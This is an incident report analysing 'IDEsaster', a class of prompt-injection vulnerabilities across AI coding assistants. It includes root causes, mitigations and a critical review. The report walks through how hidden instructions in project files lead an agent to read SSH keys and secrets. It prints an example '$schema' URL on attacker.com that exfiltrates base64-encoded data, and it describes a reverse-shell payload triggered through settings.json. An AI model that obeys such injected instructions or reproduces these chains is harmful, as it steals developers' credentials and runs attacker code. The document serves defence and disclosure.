# IDEsaster: Universal Vulnerability Class Across All AI Coding Tools

## Executive Summary

In December 2025, security researcher Ari Marzouk published the results of a six-month investigation revealing that every major AI coding tool — GitHub Copilot, Cursor, Windsurf, Kiro, Zed, Roo Code, JetBrains Junie, Cline, Gemini CLI, Claude Code, and Amazon Q Developer — shared the same fundamental vulnerability class. The research identified 30+ distinct vulnerabilities (24+ CVEs assigned, including one scored CVSS 9.6 Critical), demonstrating a three-stage attack chain that worked identically across all tested tools: inject hidden instructions into the AI's context, abuse the AI's legitimate file manipulation tools, then weaponize built-in IDE features for data exfiltration or remote code execution. An estimated 1.8 million developers were potentially exposed (per TechWorm; aggregation methodology undisclosed). Multiple vendors issued patches, and AWS published security bulletin AWS-2025-019, but no confirmed in-the-wild exploitation was reported.

## What Happened

Over approximately six months from June through November 2025, security researcher Ari Marzouk conducted a systematic security audit of every major AI-powered coding tool on the market. His central hypothesis was that the shared architectural pattern of these tools — an LLM with access to file system tools operating within an IDE — would create a shared vulnerability surface regardless of vendor or implementation.

The hypothesis proved correct with a 100% hit rate. Every tool tested was vulnerable to the same fundamental three-stage attack chain, which Marzouk termed the "IDEsaster Attack Chain."

**Stage 1 — Context Hijacking.** The attacker plants hidden instructions in sources the AI agent reads: project rule files (`.cursorrules`, `.github/copilot-instructions.md`), README files, filenames containing invisible Unicode characters, MCP server outputs, or content from pasted URLs. Because AI coding assistants are designed to read and follow instructions from project context, the boundary between legitimate project instructions and attacker-injected instructions is nonexistent at the architectural level.

**Stage 2 — Legitimate Tool Abuse.** Once the AI agent processes the injected instructions, it uses its own built-in tools — `read_file`, `write_file`, `search_files` — to access sensitive files (SSH keys, environment variables, API tokens) and to create or modify files in the project. These are the same tools developers explicitly grant the AI agent permission to use. The attack does not require any tool the agent does not already have.

**Stage 3 — IDE Feature Weaponization.** The AI writes specifically crafted files that trigger automatic behaviors built into the IDE. Three case studies demonstrate three different weaponization vectors:

- **JSON Schema Remote Fetch (Data Exfiltration):** The AI writes a JSON file containing a `$schema` field pointing to an attacker-controlled URL. The URL includes base64-encoded stolen data (credentials, source code) as query parameters. The IDE automatically fetches the schema URL for validation — transmitting the exfiltrated data to the attacker's server. This works even when diff-preview safeguards are enabled, because the schema fetch occurs before the user reviews the change.

- **IDE Settings File Overwrite (RCE):** The AI writes a malicious payload to a git hook file, then modifies `.vscode/settings.json` to configure the PHP validator to point at the payload. When the IDE processes the settings change, it automatically executes the "validator" — running the attacker's arbitrary code on the developer's machine.

- **Multi-Root Workspace Hijack (RCE):** The AI modifies `.code-workspace` files to override executable paths for language servers or tools, redirecting them to attacker-controlled binaries.

Marzouk also discovered critical vulnerabilities in MCP (Model Context Protocol) implementations: CVE-2025-6514 (CVSS 9.6 Critical) and CVE-2025-49596 (CSRF leading to RCE). Across the MCP implementations tested, 43% had command injection flaws and 30% allowed unrestricted URL fetching (sample size and selection methodology not disclosed in the primary source). Additionally, both Cursor and Windsurf were found to ship outdated Electron builds with 94+ known Chromium vulnerabilities.

Vendor responses varied significantly. AWS provided the most comprehensive response, issuing security bulletin AWS-2025-019 and patching Kiro and Amazon Q Developer between July and August 2025. Google was the fastest, patching Gemini CLI within four days of notification. GitHub and Cursor patched their assigned CVEs. Anthropic, for Claude Code, issued documentation-only mitigation without a code-level fix. This was the most minimal response among the group, though Claude Code's terminal-based architecture (rather than VS Code extension) may make certain IDE-specific auto-execution vectors (schema fetch, settings overwrite, workspace hijack) less directly applicable.

## Technical Analysis

### The Universal Attack Surface

The IDEsaster research reveals that AI coding tools share a common architectural pattern that creates a universal attack surface:

1. **An LLM that follows instructions from project context.** Every AI coding assistant reads rule files, documentation, and project files to understand context. This is the core feature, not a bug — but it means any file in the project tree is a potential injection vector.

2. **File system tools with broad permissions.** The AI agent has `read_file` and `write_file` capabilities across the project directory (and often beyond). These tools are granted by design because the agent needs them to be useful.

3. **IDE features that auto-execute based on file content.** IDEs perform automatic actions when certain files exist or change: fetching JSON schemas, validating code, loading workspace configurations, running git hooks. These features predate AI agents and were designed for a trust model where file contents are assumed to be authored by the developer.

The critical insight is that none of these three components is individually a vulnerability. The vulnerability is the composition: an entity (the LLM) that can be instructed by untrusted input, given tools to manipulate files that trigger automatic execution in the IDE.

### Case Study 1: JSON Schema Exfiltration

**CVEs:** CVE-2025-49150 (Cursor), CVE-2025-53097 (Roo Code), CVE-2025-58335 (JetBrains Junie)

The attack exploits VS Code's (and derivatives') automatic JSON schema validation:

1. Injected instructions tell the AI to read sensitive files (e.g., `~/.ssh/id_rsa`, `.env`)
2. The AI base64-encodes the file contents
3. The AI writes a JSON file with: `"$schema": "https://attacker.com/schema?data=<base64_encoded_secrets>"`
4. The IDE automatically fetches the schema URL to validate the JSON
5. The attacker's server receives the exfiltrated data as URL parameters

This bypass is particularly insidious because it works even with diff-preview enabled. The developer sees the JSON file in the diff view, but the schema fetch occurs as a side effect of the IDE preparing to show validation results — before the developer approves or rejects the change.

### Case Study 2: IDE Settings Overwrite for RCE

**CVEs:** CVE-2025-53773 (Copilot, CVSS 7.8), CVE-2025-54130 (Cursor), CVE-2025-53536 (Roo Code), CVE-2025-55012 (Zed.dev)

The attack chain:

1. Injected instructions tell the AI to create a file containing a reverse shell payload (e.g., a bash script in `.git/hooks/`)
2. The AI modifies `.vscode/settings.json` to set the PHP validation executable path to the payload file
3. The IDE loads the updated settings and executes the "PHP validator" — which is actually the attacker's payload
4. The attacker gains a reverse shell on the developer's machine

The settings file approach bypasses the confirmation dialogs that most IDEs show for direct command execution, because settings file changes are treated as configuration — not as code execution.

### Case Study 3: Multi-Root Workspace Hijack

**CVEs:** CVE-2025-64660 (Copilot), CVE-2025-61590 (Cursor), CVE-2025-58372 (Roo Code)

VS Code multi-root workspaces allow `.code-workspace` files to define multiple project roots and override per-root settings, including executable paths. The AI agent modifies the workspace file to point language server executables or tool paths at attacker-controlled binaries, achieving RCE when the IDE activates the overridden tool.

### MCP Implementation Vulnerabilities

Beyond the IDE-specific attack chains, Marzouk found systemic issues in MCP server implementations:

- **CVE-2025-6514 (CVSS 9.6 Critical):** Command injection via MCP tool parameters
- **CVE-2025-49596:** Cross-Site Request Forgery leading to RCE through MCP
- **43% of MCP implementations** had command injection flaws — user input passed directly to shell commands
- **30% allowed unrestricted URL fetching** — enabling SSRF and data exfiltration

### Outdated Runtime Dependencies

Cursor and Windsurf were found to ship with outdated Electron builds containing 94+ known Chromium vulnerabilities. While not directly exploited in the IDEsaster attack chains, these represent an additional attack surface that compounds the IDE-specific vulnerabilities.

## Root Cause Analysis

**Proximate cause:** AI coding tools use LLMs that follow instructions from untrusted project context, have file system write access, and operate within IDEs that auto-execute based on file content.

**Why 1:** Why do AI coding tools follow instructions from untrusted context? Because the core value proposition requires reading and following project-specific instructions (coding standards, architecture rules, documentation) — and there is no mechanism to distinguish between developer-authored and attacker-injected instructions.

**Why 2:** Why is there no mechanism to distinguish instruction provenance? Because the LLM processes all text in its context window as a single undifferentiated input. Project rule files, README files, code comments, and injected payloads are all treated as equally authoritative context.

**Why 3:** Why do these tools have file system write access to IDE configuration files? Because developers need AI agents to create and modify files — that is the product's purpose. No tool restricts writes to a safe subset of the file system that excludes IDE configuration, git hooks, or workspace files.

**Why 4:** Why do IDEs auto-execute based on file content without treating AI-written files differently? Because IDE auto-execution features (schema fetch, validator execution, workspace loading) were designed decades before AI agents existed. They assume that files in the project are authored or approved by the developer. No IDE has implemented an "AI-written file" provenance system that applies different trust rules.

**Why 5 / Root cause:** AI coding tools were built by integrating LLMs with file system tools into IDEs, but none of the three components — the LLM, the file tools, or the IDE — was designed with the assumption that the LLM would be an adversary-controllable entity writing to the file system. The result is a compositional vulnerability: each component is secure in its original design context, but the composition creates attack chains that no individual component prevents.

**Root cause summary:** AI coding tools compose three individually-reasonable components (instruction-following LLMs, file system tools, auto-executing IDEs) without accounting for the fact that the LLM is an adversary-controllable intermediary, creating a universal vulnerability class where untrusted input flows through the LLM into files that trigger automatic IDE execution.

## How It Could Have Been Prevented

1. **Restrict AI agent file writes to exclude IDE configuration paths.** Implement a deny-list (or preferably an allow-list) for AI-written file destinations. Files like `.vscode/settings.json`, `.code-workspace`, and `.git/hooks/*` should be off-limits to AI agents, or require explicit user approval before modification.

2. **Disable automatic IDE behaviors for AI-generated files.** IDEs should implement provenance tracking for AI-written files and suppress auto-execution (schema fetch, validator execution, workspace loading) until the developer explicitly approves the file. This is Marzouk's "Secure for AI" concept.

3. **Sandbox AI agent file system access.** Run AI agent operations in a sandboxed environment with no network egress and restricted file system scope. Writes to the real project tree should require human approval.

4. **Validate MCP server inputs against command injection.** All MCP tool parameters should be validated and sanitized before use in shell commands. The 43% command injection rate indicates a complete absence of input validation practices in the MCP ecosystem.

5. **Keep runtime dependencies current.** Shipping Electron with 94+ known Chromium vulnerabilities creates unnecessary attack surface. AI IDE vendors should maintain current Electron builds and automate dependency update pipelines.

## Solutions Analysis

### 1. Permission Scoping / Least Privilege — File Write Restrictions
- **Type:** Permission Scoping / Least Privilege
- **Plausibility:** 5/5 — Preventing the AI agent from writing to IDE configuration files, git hooks, and workspace files would directly block Case Studies 2 and 3. The concept is straightforward: maintain an allow-list of writable paths or a deny-list of sensitive paths.
- **Practicality:** 4/5 — Most AI coding tools already implement some form of file access controls. Extending them to deny writes to IDE configuration paths is a low-disruption change. The challenge is completeness: new auto-executing file types may be added in future IDE versions.
- **How it applies:** Case Study 2 (settings overwrite) and Case Study 3 (workspace hijack) both require the AI agent to write to IDE configuration files. Blocking these writes eliminates both attack chains.
- **Limitations:** Does not prevent Case Study 1 (JSON schema exfiltration), which uses a normal JSON file in the project tree. Does not address the underlying prompt injection (Stage 1). Requires ongoing maintenance as IDEs add new configuration file types.

### 2. Sandboxing and Isolation — AI Operation Sandbox
- **Type:** Sandboxing and Isolation
- **Plausibility:** 5/5 — Running AI agent file operations in an isolated sandbox with no network egress would prevent all three exfiltration and RCE vectors. The AI writes to a staging area; the developer reviews and promotes changes to the real project tree.
- **Practicality:** 2/5 — Fundamentally changes the developer workflow. AI coding tools are valued for their speed and seamlessness; inserting a staging layer between the AI and the file system significantly reduces perceived productivity. Most developers would resist this friction.
- **How it applies:** All three case studies require the AI's file writes to take effect in the actual IDE context. A sandbox breaks this assumption. JSON schema fetch would not trigger because the file is in the sandbox, not the IDE's working directory.
- **Limitations:** Developers may bypass the sandbox for convenience. The staging review becomes a security-critical chokepoint that developers may rubber-stamp under time pressure, recreating the original problem.

### 3. Guardrails / Output Filters — IDE Auto-Execution Guards
- **Type:** Guardrails / Output Filters
- **Plausibility:** 4/5 — IDEs can implement guards that suppress auto-execution behaviors (schema fetch, validator execution, workspace reloading) when triggered by recently-modified files, requiring explicit developer confirmation instead.
- **Practicality:** 4/5 — This is the "Secure for AI" concept from the research. IDE vendors control these code paths and can add confirmation prompts without requiring changes to AI agent tools. The main friction is that legitimate developer-authored changes would also trigger confirmation prompts unless provenance tracking is implemented.
- **How it applies:** Case Study 1 would be blocked if JSON schema fetch required confirmation for recently-written files. Case Study 2 would be blocked if settings changes required restart confirmation. Case Study 3 would be blocked if workspace file changes required explicit reload approval.
- **Limitations:** Requires IDE vendors to audit and guard every auto-execution path — a potentially large surface area. Confirmation fatigue may lead developers to auto-approve, undermining the control.

### 4. Input Validation and Sanitization — Context Injection Defense
- **Type:** Input Validation and Sanitization
- **Plausibility:** 2/5 — Preventing the initial prompt injection (Stage 1) is the most fundamental defense but the hardest to implement. The AI agent must read project files to be useful, and distinguishing between legitimate project instructions and adversarial injections is an unsolved problem at the LLM level. Invisible Unicode detection is feasible but represents only one of many injection channels.
- **Practicality:** 3/5 — Some injection channels (invisible Unicode in filenames, known-malicious patterns in rule files) can be filtered. But the majority of context hijacking uses natural language that is indistinguishable from legitimate project instructions.
- **How it applies:** Stage 1 (context hijacking) is the entry point for the entire attack chain. If the AI agent rejects or quarantines suspicious instructions, the subsequent stages do not execute.
- **Limitations:** Fundamental limitation of current LLM architecture: the model cannot reliably distinguish between data to process and instructions to follow. This is a mitigation layer, not a solution.

### 5. Monitoring and Detection — Exfiltration and RCE Detection
- **Type:** Monitoring and Detection
- **Plausibility:** 3/5 — Monitoring AI agent behavior for suspicious patterns (reading credential files, writing to configuration paths, creating files with external URLs) could detect attacks in progress. Behavioral baselines for AI agent tool usage can flag anomalies.
- **Practicality:** 4/5 — AI coding tools already log tool usage. Adding anomaly detection on top of existing logs is architecturally straightforward. The challenge is tuning detection rules to avoid false positives from legitimate development workflows (developers frequently read config files and write to various paths).
- **How it applies:** Reading `~/.ssh/id_rsa` followed by writing a JSON file with an external `$schema` URL is a detectable pattern. Writing to `.vscode/settings.json` to change a validator path is a flaggable event.
- **Limitations:** Detection is reactive — the damage may occur before the alert fires. Sophisticated attackers can spread the attack chain across multiple interactions to avoid pattern detection. Does not prevent the underlying vulnerability.

## Strategic Council Review

### Phase 1 — Challenger

1. **The "1.8 million developers" figure is poorly sourced and likely inflated.** The report cites TechWorm (rated "Medium" credibility) as the source for the 1.8 million figure. No methodology is provided for this estimate. It is unclear whether this means 1.8 million active users of all affected tools combined, total installations, or registered accounts. The number is used throughout the report as if it were a verified fact. Given that some of these tools (Zed, Roo Code, Cline, Kiro) have relatively small user bases, the aggregate figure needs scrutiny. This inflated-sounding number drives the "widespread" scale classification and the "high" business criticality rating.

2. **Severity rated "High" is arguably either too high or too low, depending on framing.** The report rates severity as High but acknowledges zero confirmed in-the-wild exploitation. For a vulnerability with no confirmed victims, High is aggressive. Conversely, the report documents CVSS 9.6 Critical scores and demonstrated RCE chains — if those attack chains were reproducible by a moderately skilled attacker, the absence of confirmed exploitation could reflect detection gaps rather than absence of exploitation. The analyst tries to split the difference but the justification oscillates without committing to a clear framework for how "actual_vs_potential: partial" maps to severity.

3. **The root cause analysis conflates architectural inevitability with implementation failure.** The five-why chain concludes that the vulnerability is inherent to the "composition" of LLM + file tools + IDE. But several attack chains (IDE settings overwrite, workspace hijack) are clearly preventable implementation choices — tools could deny writes to configuration paths without any architectural change. The root cause frames the problem as unfixable-by-design, when at least two of three case studies are fixable by simple deny-lists. This framing may discourage practical remediation by overstating architectural determinism.

4. **"damage_speed: instantaneous" and "damage_duration: unknown" are contradictory signals.** Rating damage speed for a vulnerability with no confirmed victims conflates theoretical attack chain execution time with actual damage. The more relevant question — whether anyone was attacked — is unanswered.

5. **Vendor response characterization may be biased by source proximity.** The report characterizes Anthropic's response as "the weakest" without exploring whether Claude Code's terminal-based architecture makes IDE-specific auto-execution attack vectors (schema fetch, settings overwrite, workspace hijack) non-applicable, which would make a documentation-only response proportionate rather than weak.

6. **The MCP vulnerability statistics (43% command injection, 30% unrestricted URL fetching) are presented without sample size or methodology.** These are striking numbers, but the report does not state how many MCP implementations were tested, what the selection criteria were, or whether the sample is representative.

### Phase 2 — Steelman

1. **The 100% vulnerability rate across all tested tools is extraordinary and justifies the vulnerability-class framing.** Every single tested tool — from major vendors including Google, Microsoft/GitHub, AWS, Anthropic, JetBrains, and Cursor — was vulnerable to the same attack pattern. The 24+ CVEs assigned by the NVD, the AWS security bulletin (AWS-2025-019), and the multi-vendor patch response all constitute third-party validation that these are real vulnerabilities. The High severity rating is well-supported by this systemic, industry-validated scope.

2. **The root cause analysis correctly identifies the compositional nature of the vulnerability.** While individual attack chains can be mitigated by deny-listing config paths, new auto-executing file types and IDE features will continue to be added, each creating a new potential weaponization vector. The root cause is not "specific files are writable" but "the trust boundary between AI-written content and IDE-executed content does not exist." This is precisely why the vulnerability appeared independently in 10+ products from different vendors — it is architectural, not implementation-specific.

3. **The solutions analysis is unusually well-calibrated and self-critical.** The sandbox solution is rated 2/5 for practicality despite being 5/5 for plausibility, honestly acknowledging the developer-experience tradeoff. Input validation is rated 2/5 for plausibility, correctly flagging the unsolved nature of instruction-data separation in LLMs. This honest assessment is stronger than most incident reports.

4. **The "partial" actual_vs_potential classification is the correct nuanced framing.** Vulnerabilities were confirmed, patches were issued, CVEs were assigned, an AWS security bulletin was published — these are concrete, documented events. The absence of confirmed exploitation does not mean absence of impact; the impact was vendor remediation cost, developer update burden, and industry trust erosion. The "partial" classification captures this accurately.

### Phase 3 — Synthesis

The challenger raised six points; three are substantive and require acknowledgment, two are well-addressed by the steelman, and one is partially valid. The 1.8 million developer figure (Challenge 1) and the MCP statistics (Challenge 6) are legitimate evidence-quality concerns — the report should note these figures come from secondary sources without disclosed methodology. However, the precision of the developer count does not materially affect the analysis: even at half the stated number, a 100% vulnerability rate across all major AI coding tools represents a systemic industry risk. The MCP statistics need a sample-size caveat, but NVD-assigned CVEs for specific MCP vulnerabilities provide independent confirmation.

The severity rating debate (Challenge 2) is resolved by the steelman: this is not a single exploited bug but a validated vulnerability class that triggered industry-wide remediation, making High defensible. The vendor response characterization (Challenge 5) is partially valid — Claude Code's terminal architecture may make certain IDE-specific attack vectors less applicable, which would contextualize the "documentation-only" response. The root cause framing (Challenge 3) is the most substantive challenge but is well-addressed: the compositional framing explains why this vulnerability appeared in every tested tool, and point fixes to specific paths do not address the ongoing creation of new auto-executing IDE features. The damage_speed classification (Challenge 4) is valid as a metadata concern but does not undermine the overall analysis.

**Confidence level: High.** The analysis is well-sourced (9 references including NVD, AWS security bulletin, and primary researcher disclosure), the root cause analysis is structurally sound, the solutions are honestly assessed, and the severity rating is supported by the evidence. The main weaknesses are precision of aggregate statistics and incomplete consideration of architectural differences between affected tools.

**Unresolved uncertainties:**
- The 1.8 million developer figure lacks disclosed methodology; an independent estimate from vendor-reported user counts would resolve this.
- Whether any in-the-wild exploitation occurred but went undetected; vendor telemetry data (not publicly available) would resolve this.
- Whether Claude Code's terminal architecture makes it materially less vulnerable to IDE auto-execution attacks; a targeted technical comparison would resolve this.
- The MCP vulnerability statistics sample size and selection methodology; access to the researcher's full dataset would resolve this.
- Whether patched vendors have fully addressed the compositional vulnerability or only the specific demonstrated attack chains; follow-up testing would resolve this.

## Key Takeaways

1. **This is a vulnerability CLASS, not a collection of bugs.** IDEsaster proves that the shared architecture of AI coding tools — LLM + file tools + auto-executing IDE — creates an inherent vulnerability surface regardless of vendor or implementation. Patching individual CVEs addresses symptoms; the architecture itself is the root cause. Every new AI coding tool that follows this pattern will be vulnerable unless it is designed with adversarial AI behavior in mind.

2. **"Secure for AI" must become a design principle for developer tools.** IDE features designed before AI agents existed assume that file content is developer-authored and trustworthy. Auto-execution behaviors (schema fetch, validator execution, workspace loading) must be re-evaluated under the assumption that an adversary-controlled LLM may write the triggering files. Marzouk's "Secure for AI" concept — auditing every auto-execution path for AI exploitability — should become a standard practice for IDE vendors.

3. **MCP is a supply chain risk multiplier.** With 43% command injection and 30% unrestricted URL fetching rates, the MCP ecosystem is a soft target for attackers. Organizations using MCP servers should audit all tool implementations for input validation and sandbox MCP execution from the host system.

4. **Restrict AI agent write access to IDE configuration files.** As an immediate mitigation, organizations should configure their AI coding tools to prevent writes to `.vscode/settings.json`, `.code-workspace`, `.git/hooks/`, and similar auto-executing paths. Where tool-level restrictions are not available, use file system permissions.

5. **Vendor response quality varies — evaluate accordingly.** AWS set the standard with a security bulletin and prompt patches. Google was fastest (4 days). Anthropic's documentation-only response for Claude Code represents the most minimal response, though Claude Code's terminal architecture may reduce applicability of IDE-specific auto-execution vectors. When selecting AI coding tools, include vendor security responsiveness in the evaluation criteria — it reveals how the vendor will handle the next vulnerability class, not just this one.
